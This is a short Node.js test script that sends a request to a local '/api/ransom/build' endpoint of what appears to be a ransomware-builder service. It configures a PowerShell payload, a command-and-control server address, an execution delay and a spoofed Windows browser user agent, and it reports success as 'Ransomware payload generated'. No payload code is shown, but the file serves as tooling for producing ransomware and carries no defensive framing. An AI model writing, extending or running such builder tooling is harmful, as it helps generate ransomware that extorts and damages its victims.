const fetch = require('node-fetch');

async function testRansomEndpoint() {
  try {
    // This is a test - in a real scenario, you would need a valid JWT token
    // To test with a valid token:
    // 1. Log in through the frontend to get a token
    // 2. Copy the token from the browser's localStorage or from the login response
    // 3. Replace 'YOUR_JWT_TOKEN_HERE' with the actual token
    const response = await fetch('http://localhost:3001/api/ransom/build', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        // 'Authorization': 'Bearer YOUR_JWT_TOKEN_HERE' // Uncomment and add valid token for real test
      },
      body: JSON.stringify({
        mode: 'fire_forget',
        payloadType: 'ps1',
        c2Server: 'http://localhost:8080',
        delay: 30,
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
      })
    });

    console.log('Status:', response.status);
    console.log('Status Text:', response.statusText);
    
    const text = await response.text();
    console.log('Response:', text.substring(0, 500) + '...'); // First 500 chars
    
    if (response.status === 200) {
      console.log('SUCCESS: Ransomware payload generated');
    } else {
      console.log('ERROR: Failed to generate payload');
      console.log('Error details:', text);
    }
  } catch (error) {
    console.error('Test failed with error:', error);
  }
}

testRansomEndpoint();
